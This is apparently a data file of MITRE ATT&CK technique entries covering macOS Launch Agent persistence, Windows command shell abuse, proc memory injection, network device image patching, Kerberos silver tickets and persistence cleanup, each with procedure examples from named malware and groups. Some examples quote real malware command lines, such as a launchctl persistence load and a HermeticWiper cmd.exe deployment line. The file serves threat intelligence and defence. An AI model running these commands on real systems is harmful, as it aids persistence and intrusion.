T1543.001,Launch Agent,"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.  Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.   Launch Agents can also be executed using the [Launchctl] command.   Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions. ","['[Calisto] adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.', '[Proton] persists via Launch Agent.', '[MacSpy] persists via a Launch Agent.', '[CrossRAT] creates a Launch Agent on macOS.', '[Dok] installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format <code>com.random.name.plist</code>.', '[Dacls] can establish persistence via a LaunchAgent.', '[MacMa] installs a `com.apple.softwareupdate.plist` file in the `/LaunchAgents` folder with the `RunAtLoad` value set to `true`. Upon user login, [MacMa] is executed from `/var/root/.local/softwareupdate` with root privileges. Some variations also include the `LimitLoadToSessionType` key with the value `Aqua`, ensuring the [MacMa] only runs when there is a logged in GUI user.', '[OSX_OCEANLOTUS.D] can create a persistence file in the folder <code>/Library/LaunchAgents</code>.', '[Bundlore] can persist via a LaunchAgent.', '[ThiefQuest] installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the <code>~/Library/LaunchAgents/</code> folder and configured with the path to the persistent binary located in the <code>~/Library/</code> folder.', '[macOS.OSAMiner] has placed a [Stripped Payloads] with a `plist` extension in the [Launch Agent] folder. ', '[CoinTicker] creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence.\t', '[Green Lambert] can create a [Launch Agent] with the `RunAtLoad` key-value pair set to <code>true</code>, ensuring the `com.apple.GrowlHelper.plist` file runs every time a user logs in.', '[CookieMiner] has installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software.', '[FruitFly] persists via a Launch Agent.', ' The [Komplex] trojan creates a persistent launch agent called with <code>$HOME/Library/LaunchAgents/com.apple.updates.plist</code> with <code>launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</code>.', '[NETWIRE] can use launch agents for persistence.', '[Keydnap] uses a Launch Agent to persist.']",False
T1059.003,Windows Command Shell,"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd] is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services] such as [SSH]  Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.  Adversaries may leverage [cmd] to execute various commands and payloads. Common uses include [cmd] to execute a single command, or abusing [cmd] interactively with input and output forwarded over a command and control channel.","['[SeaDuke] is capable of executing commands.', '[Lazarus Group] malware uses cmd.exe to execute commands on a compromised host. A Destover-like variant used by [Lazarus Group] uses a batch file mechanism to delete its binaries from the system.', '[InnaputRAT] launches a shell to execute commands on the victim’s machine.', '[Daserf] can execute shell commands.', 'A module in [CozyCar] allows arbitrary commands to be executed by invoking <code>C:\\Windows\\System32\\cmd.exe</code>.', '[OutSteel] has used `cmd.exe` to scan a compromised host for specific file extensions.', '[Orz] can execute shell commands. [Orz] can execute commands with JavaScript.', '[BackConfig] can download and run batch files to execute commands on a compromised host.', '[FlawedAmmyy] has used `cmd` to execute commands on a compromised host.', '[Lizar] has a command to open the command-line on the infected system. ', '[BoxCaon] can execute arbitrary commands and utilize the ""ComSpec"" environment variable.', '[Pisloader] uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.', '[OceanSalt] can create a reverse shell on the infected endpoint using cmd.exe. [OceanSalt] has been executed via malicious macros.', '[Seth-Locker] can execute commands via the command line shell.', '[Anchor] has used cmd.exe to run its self deletion routine.', 'During [Operation Wocao] threat actors spawned a new `cmd.exe` process to execute commands. ', '[CALENDAR] has a command to run cmd.exe to execute commands.', '[QakBot] can use cmd.exe to launch itself and to execute multiple C2 commands.', '[HermeticWizard] can use `cmd.exe` for execution on compromised hosts.', '[NanoCore] can open a remote command-line interface and execute commands. [NanoCore] uses JavaScript files.', 'Several tools used by [Suckfly] have been command-line driven.', '[GALLIUM] used the Windows command shell to execute commands.', '[Pteranodon] can use `cmd.exe` for execution on victim systems.', '[BLINDINGCAN] has executed commands via cmd.exe.', '[Seasalt] uses cmd.exe to create a reverse shell on the infected endpoint.', '[Magic Hound] has used the command-line interface for code execution.', '[PoetRAT] has called cmd through a Word document macro.', '[TSCookie] has the ability to execute shell commands on the infected host.', '[China Chopper] server component is capable of opening a command terminal.', '[ZIRCONIUM] has used a tool to open a Windows Command Shell on a remote host.', '[Dark Caracal] has used macros in Word documents that would download a second stage if executed.', '[SQLRat] has used SQL to execute JavaScript and VB scripts on the host system.', '[Woody RAT] can execute commands using `cmd.exe`.', '[StrifeWater] can execute shell commands using `cmd.exe`.', ""[Wizard Spider] has used `cmd.exe` to execute commands on a victim's machine."", '[RTM] uses the command line and rundll32.exe to execute.', '[REvil] can use the Windows command line to delete volume shadow copies and disable recovery.', '[JPIN] can use the command-line utility cacls.exe to change file permissions.', '[ServHelper] can execute shell commands against [cmd]', '[Okrum] backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.', '[Bumblebee] can use `cmd.exe` to drop and run files.', ""[Small Sieve] can use `cmd.exe` to execute commands on a victim's system."", '[Cardinal RAT] can execute commands.', '[BlackMould] can run cmd.exe with parameters.', '[Taidoor] can copy cmd.exe into the system temp folder.', '[PLEAD] has the ability to execute shell commands on the compromised host.', ""[DropBook] can execute arbitrary shell commands on the victims' machines. "", '[GrimAgent] can use the Windows Command Shell to execute commands, including its own removal.', '[Volt Typhoon] has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery.', '[Comnie] executes BAT scripts.', '[OilRig] has used macros to deliver malware such as [QUADAGENT] and [OopsIE] [OilRig] has used batch scripts.', '[Threat Group-3390] has used command-line interfaces for execution.', '[Bazar] can launch cmd.exe to perform reconnaissance commands.', '[Brute Ratel C4] can use cmd.exe for execution.', '[KEYMARBLE] can execute shell commands using cmd.exe.', '[Threat Group-1314] actors spawned shells on remote systems on a victim network to execute commands.', '[jRAT] has command line access.', '[Emissary] has the capability to create a remote shell and execute specified commands.', '[RGDoor] uses cmd.exe to execute commands on the victim’s machine.', '[Out1] can use native command line for execution.', '[Umbreon] provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet', '[ccf32] has used `cmd.exe` for archiving data and deleting files.', '[UPPERCUT] uses cmd.exe to execute commands on the victim’s machine.', '[Kasidet] can execute commands using cmd.exe.', '[BONDUPDATER] can read batch commands in a file sent from its C2 server and execute them with cmd.exe.', '[SharpStage] can execute arbitrary commands with the command line.', '[CARROTBAT] has the ability to execute command line arguments on a compromised host.', '[Mafalda] can execute shell commands using `cmd.exe`.', '[XTunnel] has been used to execute remote commands.', '[LookBack] executes the <code>cmd.exe</code> command.', '[Bandook] is capable of spawning a Windows command shell.', '[RATANKBA] uses cmd.exe to execute commands.', '[SamSam] uses custom batch scripts to execute some of its components.', '[Shark] has the ability to use `CMD` to execute commands.', '[RDAT] has executed commands using <code>cmd.exe /c</code>.\t', '[More_eggs] has used cmd.exe for execution.', '[Nomadic Octopus] used <code>cmd.exe /c</code> within a malicious macro.', '[TeamTNT] has used batch scripts to download tools and executing cryptocurrency miners.', '[PyDCrypt] has used `cmd.exe` for execution.', '[HTTPBrowser] is capable of spawning a reverse shell on a victim.', '[Dtrack] has used <code>cmd.exe</code> to add a persistent service.', '[Machete] has used batch files to initiate additional downloads of malicious files.', '[Ragnar Locker] has used cmd.exe and batch scripts to execute commands.', 'During [Night Dragon] threat actors used [zwShell] to establish full remote control of the connected machine and run command-line shells.', '[APT38] has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim’s machine.', '[MuddyWater] has used a custom tool for creating reverse shells.', '[hcdLoader] provides command-line access to the compromised system.', '[UBoatRAT] can start a command shell.', '[MoleNet] can execute commands via the command line utility.', '[Tarrask] may abuse the Windows schtasks command-line tool to create ""hidden"" scheduled tasks.', 'Adversaries can direct [BACKSPACE] to execute from the command line on infected hosts, or have [BACKSPACE] create a reverse shell.', '[DarkTortilla] can use `cmd.exe` to add registry keys for persistence.', ""[HAFNIUM] has used `cmd.exe` to execute commands on the victim's machine."", '[Pony] has used batch scripts to delete itself after execution.\t', ' [AuTo Stealer] can use `cmd.exe` to execute a created batch file.', '[Mis-Type] has used `cmd.exe` to run commands on a compromised host.', '[BLACKCOFFEE] has the capability to create a reverse shell.', 'An [APT3] downloader uses the Windows command <code>""cmd.exe"" /C whoami</code>. The group also uses a tool to execute commands on remote computers.', '[Micropsia] creates a command-line shell using cmd.exe.', '[4H RAT] has the capability to create a remote shell.', '[SYSCON] has the ability to execute commands through [cmd] on a compromised host.', '[PcShare] can execute `cmd` commands on a compromised host.', '[SLOTHFULMEDIA] can open a command line to execute commands.', '[APT32] has used cmd.exe for execution. ', '[Remexi] silently executes received commands with cmd.exe.', '[RunningRAT] uses a batch file to kill a security program task and then attempts to remove itself.', '[H1N1] kills and disables services by using cmd.exe.', '[FIN10] has executed malicious .bat files containing PowerShell commands.', '[MCMD] can launch a console process (cmd.exe) with redirected standard input and output.', ""[MarkiRAT] can utilize cmd.exe to execute commands in a victim's environment."", '[Peppy] has the ability to execute shell commands.', '[Cuba] has used <code>cmd.exe /c</code> and batch files for execution. ', '[Gorgon Group] malware can use cmd.exe to download and execute payloads and to execute commands on the system.', '[FIN6] has used <code>kill.bat</code> script to disable security tools.', '[Saint Bot] has used `cmd.exe` and `.bat` scripts for execution.', '[Spark] can use cmd.exe to run commands. ', '[Uroburos] has the ability to use the command line for execution on the targeted system.', '[Cobian RAT] can launch a remote command shell interface for executing commands.', '[Carbanak] has a command to create a reverse shell.', '[Fox Kitten] has used cmd.exe likely as a password changing mechanism.', '[Blue Mockingbird] has used batch script files to automate execution and deployment of payloads.', '[AuditCred] can open a reverse shell on the system to execute commands.', '[SideTwist] can execute shell commands on a compromised host.', 'An [APT28] loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads.', '[Ryuk] has used <code>cmd.exe</code> to create a Registry entry to establish persistence.', '[TinyTurla] has been installed using a .bat file.', '[KGH_SPY] has the ability to set a Registry key to run a cmd.exe command.', '[MURKYTOP] uses the command-line interface.', '[S-Type] has provided the ability to execute shell commands on a compromised host.', '[Wiarp] creates a backdoor through which remote attackers can open a command line interface.', '[Kimsuky] has executed Windows commands by using `cmd` and running batch scripts.', 'Operators deploying [Netwalker] have used batch scripts to retrieve the [Netwalker] payload.', '[Metador] has used the Windows command line to execute commands.', '[Caterpillar WebShell] can run commands on the compromised asset with CMD functions.', '[KOCTOPUS] has used `cmd.exe` and batch files for execution.', '[Flagpro] can use `cmd.exe` to execute commands received from C2.', '[Lokibot] has used <code>cmd /c</code> commands embedded within batch scripts. ', '[Akira] executes from the Windows command line and can take various arguments for execution.', '[Hikit] has the ability to create a remote shell and run given commands.', '[MoonWind] can execute commands via an interactive command shell. [MoonWind] uses batch scripts for various purposes, including to restart and uninstall itself.', '[Mustang Panda] has executed HTA files via cmd.exe, and used batch scripts for collection.', '[Dipsind] can spawn remote shells.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used the `xp_cmdshell` command in MS-SQL.', '[ECCENTRICBANDWAGON] can use [cmd] to execute commands on a victim’s machine.', '[HOPLIGHT] can launch cmd.exe to execute commands on the system.\t', '[ADVSTORESHELL] can create a remote shell and run a given command.', '[Tropic Trooper] has used Windows command scripts.\t', '[SEASHARPEE] can execute commands on victims.', '[WastedLocker] has used [cmd] to execute commands on the system.', '[TURNEDUP] is capable of creating a reverse shell.', '[Linfo] creates a backdoor through which remote attackers can start a remote shell.', '[PlugX] allows actors to spawn a reverse shell on a victim.', '[DnsSystem] can use `cmd.exe` for execution.', '[BBK] has the ability to use [cmd] to run a Portable Executable (PE) on the compromised host.', '[GoldenSpy] can execute remote commands via the command-line interface.\t', '[Goopy] has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.\t', ""[OopsIE] uses the command prompt to execute commands on the victim's machine."", '[MechaFlounder] has the ability to run commands on a compromised host.', '[QUADAGENT] uses cmd.exe to execute scripts and commands on the victim’s machine.', '[APT41] used <code>cmd.exe /c</code> to execute commands on remote machines. [APT41] used a batch file to install persistence for the [Cobalt Strike] BEACON loader.', '[Babuk] has the ability to use the command line to control execution on compromised hosts.', 'During [Operation Honeybee] various implants used batch scripting and `cmd.exe` for execution. ', '[ShimRat] can be issued a command shell function from the C2.', '[NETEAGLE] allows adversaries to execute shell commands on the infected host.', '[Sardonic] has the ability to run `cmd.exe` or other interactive processes on a compromised computer.', '[Black Basta] can use `cmd.exe` to enable shadow copy deletion.', '[HARDRAIN] uses cmd.exe to execute <code>netsh</code>commands.', '[Koadic] can open an interactive command-shell to perform command line functions on victim machines. [Koadic] performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.', '[TAINTEDSCRIBE] can enable Windows CLI access and execute files.', '[HermeticWiper] can use `cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\_1636727589.6007507 2>&1` to deploy on an infected system.', 'During [FunnyDream] the threat actors used `cmd.exe` to execute the wmiexec.vbs script.', '[Clambling] can use cmd.exe for command execution.', 'During [Frankenstein] the threat actors ran a command script to set up persistence as a scheduled task named ""WinUpdate"", as well as other encoded commands from the command-line ', ""[Indrik Spider] has used batch scripts on victim's machines. "", '[RogueRobin] uses Windows Script Components.', '[DarkWatchman] can use `cmd.exe` to execute commands.', '[Aquatic Panda] has attempted and failed to run Bash commands on a Windows host by passing them to <code>cmd /C</code>.', '[EvilBunny] has an integrated scripting engine to download and execute Lua scripts.', '[FIN13] has leveraged `xp_cmdshell` and Windows Command Shell to execute commands on a compromised machine. [FIN13] has also attempted to leverage the ‘xp_cmdshell’ SQL procedure to execute remote commands on internal MS-SQL servers.', '[EnvyScout] can use cmd.exe to execute malicious files on compromised hosts.', '[JHUHUGIT] uses a .bat file to execute a .dll.', '[USBferry] can execute various Windows commands.\t', '[Remcos] can launch a remote command line to execute commands on the victim’s machine.', '[WellMess] can execute command line scripts received from C2.', '[RedLeaves] can receive and execute commands with cmd.exe. It can also provide a reverse shell.', '[LightNeuron] is capable of executing commands via cmd.exe.', '[InvisiMole] can launch a remote shell to execute commands.', '[Milan] can use `cmd.exe` for discovery actions on a targeted system.', '[DarkComet] can launch a remote shell to execute commands on the victim’s machine.', '[PoisonIvy] creates a backdoor through which remote attackers can open a command-line interface.', '[RainyDay] can use the Windows Command Shell for execution.', '[ComRAT] has used <code>cmd.exe</code> to execute commands.', '[GoldMax] can spawn a command shell, and execute native commands.', '[Turla] RPC backdoors have used cmd.exe to execute commands.', '[ZLib] has the ability to execute shell commands.', '[HotCroissant] can remotely open applications on the infected host with the <code>ShellExecuteA</code> command.', ""[MegaCortex] has used <code>.cmd</code> scripts on the victim's system. "", '[Siloscape] can run cmd through an IRC channel.', '[DEADEYE] can run `cmd /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll` to combine separated sections of code into a single DLL prior to execution.', '[Chimera] has used the Windows Command Shell and batch scripts for execution on compromised hosts.', '[GreyEnergy] uses cmd.exe to execute itself in-memory.', ""[Volgmer] can execute commands on the victim's machine."", '[Sowbug] has used command line during its intrusions.', '[TrickBot] has used macros in Excel documents to download and deploy the malware on the user’s machine.', '[Cobalt Group] has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files.', '[Clop] can use cmd.exe to help execute commands on the system. ', '[NavRAT] leverages cmd.exe to perform discovery techniques. [NavRAT] loads malicious shellcode and executes it in memory.', '[ToddyCat] has used .bat scripts and `cmd` for execution on compromised hosts.', '[BADNEWS] is capable of executing commands via cmd.exe.', ""[HiddenWasp] uses a script to automate tasks on the victim's machine and to assist in execution."", '[ZxShell] can launch a reverse command shell.', '[Kevin] can use a renamed image of `cmd.exe` for execution.', '[Sakula] calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. [Sakula] also has the capability to invoke a reverse shell.', 'During the [SolarWinds Compromise] [APT29] used `cmd.exe` to execute commands on remote machines.', '[DealersChoice] makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.', '[SUGARUSH] has used `cmd` for execution on an infected host.', 'During [C0017] [APT41] used `cmd.exe` to execute reconnaissance commands.', 'The [Maze] encryption process has used batch scripts with various commands.', '[DanBot] has the ability to execute arbitrary commands via `cmd.exe`.', '[POWRUNER] can execute commands from its C2 server.', '[Hi-Zor] has the ability to create a reverse shell.', '[WhisperGate] can use `cmd.exe` to execute commands.', '[Empire] has modules for executing scripts.', 'The C# implementation of  the [CharmPower] command execution module can use <code>cmd</code>.', '[Helminth] can provide a remote shell. One version of [Helminth] uses batch scripting.', '[NETWIRE] can issue commands using cmd.exe.', '[httpclient] opens cmd.exe on the victim.', '[KONNI] has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain. ', ""[Revenge RAT] uses cmd.exe to execute commands and run scripts on the victim's machine."", '[QuasarRAT] can launch a remote shell to execute commands on the victim’s machine.', '[JCry] has used <code>cmd.exe</code> to launch PowerShell.\t', 'During [Operation CuckooBees] the threat actors used batch scripts to perform reconnaissance.', '[HAWKBALL] has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.', '[WEBC2] can open an interactive command shell.', '[Misdat] is capable of providing shell functionality to the attacker to execute commands.', '[GravityRAT] executes commands remotely on the infected host.', 'During [C0015] the threat actors used `cmd.exe` to execute commands and run malicious binaries.', '[Zebrocy] uses cmd.exe to execute commands on the system. ', '[Exaramel for Windows] has a command to launch a remote shell and executes commands on the victim’s machine.', '[Dragonfly] has used various types of scripting to perform operations, including batch scripts.', '[TEXTMATE] executes cmd.exe to provide a reverse shell to adversaries.', '[LazyScripter] has used batch files to deploy open-source and multi-stage RATs.', '[xCaon] has a command to start an interactive shell.', '[Gold Dragon] uses cmd.exe to execute commands for discovery.', '[APT5] has used cmd.exe for execution on compromised systems.', '[Lucifer] can issue shell commands to download and execute additional payloads.', '[Nebulae] can use CMD to execute a process.', '[Rising Sun] has executed commands using `cmd.exe /c “<command> > <%temp%>\\AM<random>. tmp” 2>&1`. ', '[Chaes] has used [cmd] to execute tasks on the system. ', '[CoinTicker] executes a bash script to establish a reverse shell.', '[Darkhotel] has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.', '[Mosquito] executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.', '[Patchwork] ran a reverse shell with Meterpreter. [Patchwork] used JavaScript code and .SCT files on victim machines.', '[MirageFox] has the capability to execute commands using cmd.exe.', '[Metamorfo] has used <code>cmd.exe /c</code> to execute files. ', '[Meteor] can run `set.bat`, `update.bat`, `cache.bat`, `bcd.bat`, `msrun.bat`, and similar scripts.', '[Bankshot] uses the command-line interface to execute arbitrary commands.', '[Emotet] has used cmd.exe to run a PowerShell script. ', '[Bisonal] has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.', '[BADHATCH] can use `cmd.exe` to execute commands on a compromised host. ', '[APT37] has used the command-line interface.', '[Crimson] has the ability to execute commands with the COMSPEC environment variable.', '[Zeus Panda] can launch an interface where it can execute several commands on the victim’s PC.', '[FIN7] used the command prompt to launch commands on the victim’s machine.', '[PingPull] can use `cmd.exe` to run various commands as a reverse shell.', '[WarzoneRAT] can use `cmd.exe` to execute malicious code.', '[Ke3chang] has used batch scripts in its malware to install persistence mechanisms.', '[TDTESS] provides a reverse shell on the victim.', '[SILENTTRINITY] can use `cmd.exe` to enable lateral movement using DCOM.', '[STARWHALE] has the ability to execute commands via `cmd.exe`.', '[Gelsemium] can use a batch script to delete itself.', '[BRONZE BUTLER] has used batch scripts and the command-line interface for execution.', '[Ember Bear] had used `cmd.exe` and Windows Script Host (wscript) to execute malicious code.', '[Turian] can create a remote shell and execute commands using [cmd]', '[adbupd] can run a copy of cmd.exe.', '[Samurai] can use a remote command module for execution via the Windows command line.', '[Higaisa] used <code>cmd.exe</code> for execution.', '[zwShell] can launch command-line shells.', '[TYPEFRAME] can uninstall malware components using a batch script. [TYPEFRAME] can execute commands using a shell.', '[menuPass] executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands. [menuPass] has used malicious macros embedded inside Office documents to execute files.', '[Trojan.Karagany] can perform reconnaissance commands on a victim machine via a cmd.exe process.', '[Proxysvc] executes a binary on the system and logs the results into a temp file by using: <code>cmd.exe /c ""<file_path> > %temp%\\PM* .tmp 2>&1""</code>.', '[FIN8] has used a Batch file to automate frequently executed post compromise cleanup activities. [FIN8] has also executed commands remotely via `cmd.exe`.', '[SharpDisco] can use `cmd.exe` to execute plugins and to send command output to  specified SMB shares.', '[SNUGRIDE] is capable of executing commands and spawning a reverse shell.', 'During [Operation Dream Job] [Lazarus Group] launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell.', '[Squirrelwaffle] has used `cmd.exe` for execution.', '[LoudMiner] used a batch script to run the Linux virtual machine as a service.', '[APT18] uses cmd.exe to execute commands on the victim’s machine.', '[PowerDuke] runs <code>cmd.exe /c</code> and sends the output to its C2.', '[KeyBoy] can launch interactive shells for communicating with the victim machine.', '[Egregor] has used batch files for execution and can launch Internet Explorer from cmd.exe. ', '[TA551] has used <code>cmd.exe</code> to execute commands.', ""[RobbinHood] uses cmd.exe on the victim's computer."", '[BlackCat] can execute commands on a compromised network with the use of `cmd.exe`.', '[Conti] can utilize command line options to allow an attacker control over how it scans and encrypts files.', '[FELIXROOT] executes batch scripts on the victim’s machine, and can launch a reverse shell for command execution.', '[Rancor] has used cmd.exe to execute commmands.', '[APT1] has used the Windows command shell to execute commands, and batch scripting to automate execution.', '[PLAINTEE] uses cmd.exe to execute commands on the victim’s machine.', '[FunnyDream] can use `cmd.exe` for execution on remote hosts.', '[Ixeshe] is capable of executing commands via [cmd]', '[PHOREAL] is capable of creating reverse shell.', '[ABK] has the ability to use [cmd] to run a Portable Executable (PE) on the compromised host.', '[DownPaper] uses the command line.', '[SDBbot] has the ability to use the command shell to execute commands on a compromised host.', '[Astaroth] spawns a CMD process to execute commands. ', '[Silence] has used Windows command-line to run commands.', '[KOMPROGO] is capable of creating a reverse shell.', '[BISCUIT] has a command to launch a command shell on the system.', '[Gamaredon Group] has used various batch scripts to establish C2 and download additional files. [Gamaredon Group] backdoor malware has also been written to a batch file.', '[Cinnamon Tempest] has executed ransomware using batch scripts deployed via GPO.', '[Mivast] has the capability to open a remote shell and run basic commands.', '[Denis] can launch a remote shell to execute arbitrary commands on the victim’s machine.', '[StreamEx] has the ability to remotely execute commands.', '[njRAT] can launch a command shell interface for executing commands.', '[cmd] is used to execute programs and other actions at the command-line interface.', '[RCSession] can use `cmd.exe` for execution on compromised hosts.', 'Following exploitation with [LOWBALL] malware, [admin@338] actors created a file containing a list of commands to be executed on the compromised computer.', '[HOMEFRY] uses a command-line interface.', '[Cobalt Strike] uses a command-line interface to interact with systems.', '[BabyShark] has used cmd.exe to execute commands.\t', '[Kazuar] uses cmd.exe to execute commands on the victim’s machine.', '[TinyZBot] supports execution from the command-line.', '[Felismus] uses command line for execution.', '[Action RAT] can use `cmd.exe` to execute commands on an infected host.', '[TA505] has executed commands using <code>cmd.exe</code>.', '[DarkGate] uses a malicious Windows Batch script to run the Windows <code>code</code> utility to retrieve follow-on script payloads.', '[APT29] used <code>cmd.exe</code> to execute commands on remote machines.', '[Sandworm Team] has run the  <code>xp_cmdshell</code> command in MS-SQL. ', '[UNC2452] used <code>cmd.exe</code> to execute commands on remote machines.', 'Several commands are supported by the [Honeybee] implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint. [Honeybee] used batch scripting.', '[Frankenstein] has run a command script to set up persistence as a scheduled task named ""WinUpdate"", as well as other encoded commands from the command-line.', '[Operation Wocao] has spawned a new <code>cmd.exe</code> process to execute commands.\t ', '[Dragonfly 2.0] used various types of scripting to perform operations, including batch scripts.', '[Leviathan] uses a backdoor known as BADFLICK that is is capable of generating a reverse shell, and has used multiple types of scripting for execution, including JavaScript and JavaScript Scriptlets in XML..', '[Cobalt Strike] uses a command-line interface to interact with systems.']",False
T1055.009,Proc Memory,"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.   Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.   Other techniques such as [Dynamic Linker Hijacking] may be used to populate a target process with more available gadgets. Similar to [Process Hollowing] proc memory injection may target child processes (such as a backgrounded copy of sleep).   Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ",[],
T1601.001,Patch System Image,"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.  To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.  To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.  In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit] method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.  By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption] authentication, via [Network Device Authentication] and perimeter defenses, via [Network Boundary Bridging]  Adding new capabilities for the adversary’s purpose include [Keylogging] [Multi-hop Proxy] and [Port Knocking]  Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image] one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade.   When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot]   When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit] to achieve persistence. ",['[SYNful Knock] is malware that is inserted into a network device by patching the operating system image.'],
T1558.002,Silver Ticket,"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.  Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.  Password hashes for target services may be obtained using [OS Credential Dumping] or [Kerberoasting]","['[Rubeus] can create silver tickets.', '[AADInternals] can be used to forge Kerberos tickets using the password hash of the AZUREADSSOACC account.', '[Mimikatz] kerberos module can create silver tickets.', '[Empire] can leverage its implementation of [Mimikatz] to obtain and use silver tickets.']",
T1070.009,Clear Persistence,"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry] [Plist File Modification] or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account]  In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.","['[SUNBURST] removed IFEO registry values to clean up traces of persistence.', '[MCMD] has the ability to remove set Registry Keys, including those used for persistence.', '[Bazar] loader can delete scheduled tasks created by a previous instance of the malware.', '[Pillowmint] can uninstall the malicious service from an infected machine.', '[Misdat] is capable of deleting Registry keys used for persistence.', '[S-Type] has deleted accounts it has created.', '[njRAT] is capable of manipulating and deleting registry keys, including those used for persistence.', '[KOCTOPUS] can delete created registry keys used for persistence as part of its cleanup procedure.', '[GrimAgent] can delete previously created tasks on a compromised host.', '[RTM] has the ability to remove Registry entries that it created for persistence.']",False
